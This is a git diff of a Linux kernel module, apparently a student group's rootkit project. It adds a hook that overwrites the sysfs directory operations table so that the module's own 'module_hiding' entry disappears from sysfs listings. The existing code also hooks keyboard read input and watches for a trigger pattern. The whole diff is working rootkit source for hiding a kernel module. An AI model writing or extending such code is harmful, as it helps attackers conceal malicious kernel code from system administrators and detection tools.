@@ -10,6 +10,12 @@
 #include "hook_read.h"
 
 
+/// sysfs stuff
+typedef int (*fun_int_file_dirent_filldir_t)(struct file *, void*, filldir_t);
+fun_int_file_dirent_filldir_t original_sysfs_readdir;
+filldir_t original_sysfs_filldir;
+
+
 char activate_pattern[] = "hallohallo";
 int size_of_pattern = sizeof(activate_pattern)-1;
 int cur_position = 0;
@@ -111,14 +117,47 @@ static void handle_input(char *buf, int count)
     }
 }
 
+
+int hooked_sysfs_filldir(void* __buf, const char* name, int namelen, loff_t offset, u64 ino, unsigned d_type){
+    if (hidden && strcmp(name, "module_hiding") == 0){
+        OUR_DEBUG("hooked_sysfs_filldir: %s\n", (char*)name);
+        return 0;
+    }
+    return original_sysfs_filldir(__buf, name, namelen, offset, ino, d_type);
+}
+
+int hooked_sysfs_readdir(struct file * filp, void* dirent, filldir_t filldir){
+    OUR_DEBUG("Hooked sysfs_readdir.\n");
+    original_sysfs_filldir = filldir;
+    return original_sysfs_readdir(filp, dirent, hooked_sysfs_filldir);
+}
+
+
+void hook_sysfs(void){
+    struct file_operations* sysfs_dir_ops;
+    sysfs_dir_ops = (struct file_operations*)ptr_sysfs_dir_operations;
+    original_sysfs_readdir = sysfs_dir_ops->readdir;
+    make_page_writable((long unsigned int) sysfs_dir_ops);
+    sysfs_dir_ops->readdir = hooked_sysfs_readdir;
+    make_page_readonly((long unsigned int) sysfs_dir_ops);
+}
+
+
+void unhook_sysfs(void){
+    struct file_operations* sysfs_dir_ops;
+    sysfs_dir_ops = (struct file_operations*)ptr_sysfs_dir_operations;
+    make_page_writable((long unsigned int) sysfs_dir_ops);
+    sysfs_dir_ops->readdir = original_sysfs_readdir;
+    make_page_readonly((long unsigned int) sysfs_dir_ops);
+}
+
+
 /* Initialization routine */
 static int __init _init_module(void)
 {
     printk(KERN_INFO "This is the kernel module of gruppe 6. %d\n", size_of_pattern);
     hook_read(handle_input);
-
-
-    //hide_me();
+    hook_sysfs();
 
     return 0;
 }
@@ -126,6 +165,7 @@ static int __init _init_module(void)
 /* Exiting routine */
 static void __exit _cleanup_module(void)
 {
+    unhook_sysfs();
     unhook_read();
     printk(KERN_INFO "Gruppe 6 says goodbye.\n");
 }
